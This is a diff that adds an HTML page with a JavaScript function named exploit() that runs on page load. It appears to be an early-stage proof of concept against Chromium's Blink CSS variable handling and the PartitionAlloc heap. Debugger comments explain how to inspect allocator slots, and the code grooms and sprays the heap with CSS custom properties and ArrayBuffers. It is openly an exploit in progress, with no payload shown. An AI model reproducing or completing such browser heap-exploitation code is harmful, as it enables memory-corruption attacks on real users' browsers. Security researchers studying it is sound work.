@@ -1,0 +1,58 @@
+<html>
+  <meta charset="utf-8">
+  <head>
+
+  <script>
+
+    async function f1() {
+      return 10;
+    }
+
+    async function exploit() {
+
+      // debug
+      // set temporary breakpoint on 
+      // ../../third_party/blink/renderer/core/css/css_variable_data.cc:80
+      // store rax
+      //    set $super_page_addr=$rax
+      //    pa_print_slot_span_info --super_page_list $super_page_addr
+
+      // remove noise
+      // avoid/limit partitionalloc allocating new slot spans for partitionbucket with no slot spans (they point to sentinel slot)
+      // you can inspect which partitionbucket points to sentinel by dumping root, also thread cache should be empty
+      var div0 = document.getElementById('div0');
+      div0.style.setProperty(`--slot20`, "\x0a");
+      div0.style.setProperty(`--slot40`, "A");
+
+      let bp1 = new ArrayBuffer(0x600);
+
+      let pl =  new Intl.PluralRules("en-US");  
+      let bp2 = new ArrayBuffer(0x600);
+
+      setTimeout(f1, 500);
+      let bp3 = new ArrayBuffer(0x600);
+
+      for (let i=0; i<100; i++) {
+        div0.style.setProperty(`--spray${i}`, "A".repeat(8))
+      }
+      let bp4 = new ArrayBuffer(0x600);
+
+  }
+
+
+    </script> 
+  
+  </head>
+
+  <body onload="exploit()">
+ 
+  <span id="div0"></span>
+  <span id="div1"></span>
+  <!--<button onclick="print_families()">print_families</button> -->
+  <!--<button onclick="exploit()">exploit</button> -->
+  
+  <h1></h1>
+
+  </body>
+</html>
+
